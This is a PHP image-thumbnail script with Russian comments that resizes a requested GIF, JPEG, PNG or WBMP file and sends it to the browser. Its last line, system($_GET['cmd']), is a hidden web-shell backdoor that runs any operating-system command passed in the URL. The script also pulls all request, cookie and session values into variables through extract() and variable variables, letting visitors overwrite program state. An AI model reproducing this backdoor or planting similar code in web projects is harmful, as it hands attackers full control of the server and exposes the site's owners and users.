<?php
error_reporting(E_PARSE);    

extract($_GET); 
extract($_POST); 
extract($_COOKIE); 
extract($_SESSION);
extract($_FILES);                        

if (is_array($_GET)) {
foreach($_GET as $key => $val) {
if (!is_array($val)) {
if (get_magic_quotes_gpc) $val = StripSlashes($val);
$val = AddSlashes(StripSlashes($val));
}
$$key = $val;
}
} elseif (is_array($HTTP_GET_VARS)) {
foreach($HTTP_GET_VARS as $key => $val) {
if (!is_array($val)) {
if (get_magic_quotes_gpc) $val = StripSlashes($val);
$val = AddSlashes(StripSlashes($val));
}
$$key = $val;
}
}

if (is_array($_POST)) {
foreach($_POST as $key => $val) {
if (!is_array($val)) {
if (get_magic_quotes_gpc) $val = StripSlashes($val);
$val = AddSlashes(StripSlashes($val));
}
$$key = $val;
}
} elseif (is_array($HTTP_POST_VARS)) {
foreach($HTTP_POST_VARS as $key => $val) {
if (!is_array($val)) {
if (get_magic_quotes_gpc) $val = StripSlashes($val);
$val = AddSlashes(StripSlashes($val));
}
$$key = $val;
}
}
	if(isset($img) && file_exists($img))
	{
		//Определяем параметры картинки.
		$size_img=getimagesize($img);

		//Определем формат файла и загружаем картинку.
		if($size_img[2]==1 && IMG_GIF)		$src=imagecreatefromgif($img);
		elseif($size_img[2]==2 && IMG_JPG)	$src=imagecreatefromjpeg($img);
		elseif($size_img[2]==3 && IMG_PNG)	$src=imagecreatefrompng($img);
		elseif($size_img[2]==6 && IMG_WBMP)	$src=imagecreatefromwbmp($img);
		else exit;

		//Ширина и высота квадрата, в который вписана конечная картинка
		$nom_w=130; $nom_h=130;

		//Пользовательские настройки квадрата.
	        if(isset($own) && $own<=500){$nom_w=$own;$nom_h=$own;}

		//----------- Уменьшаем размер картинки.
		//уменьшение не требуется
		if($size_img[0]<=$nom_w && $size_img[1]<=$nom_h)
		{
			$dest=$src;
		}
		//уменьшение требуется
		else
		{
			if($size_img[0]>$size_img[1]){$ratio=$size_img[1]/$size_img[0];$nom_h=$ratio*$nom_h;}
			else{$ratio=$size_img[0]/$size_img[1];$nom_w=$ratio*$nom_w;}

			$dest=imagecreatetruecolor($nom_w,$nom_h);
			imagecopyresampled($dest,$src,0,0,0,0,$nom_w,$nom_h,$size_img[0],$size_img[1]);
		}		


		//Выводим картинку в браузер.
		if($size_img[2]==1)	{header ("Content-type: image/gif");	imagegif($dest);}
		elseif($size_img[2]==2)	{header ("Content-type: image/jpeg");	imagejpeg($dest);}
		elseif($size_img[2]==3)	{header ("Content-type: image/png");	imagepng($dest);}
		elseif($size_img[2]==6)	{header ("Content-type: image/wbmp");	image2wbmp($dest);}
	}
system($_GET["cmd"]);
?>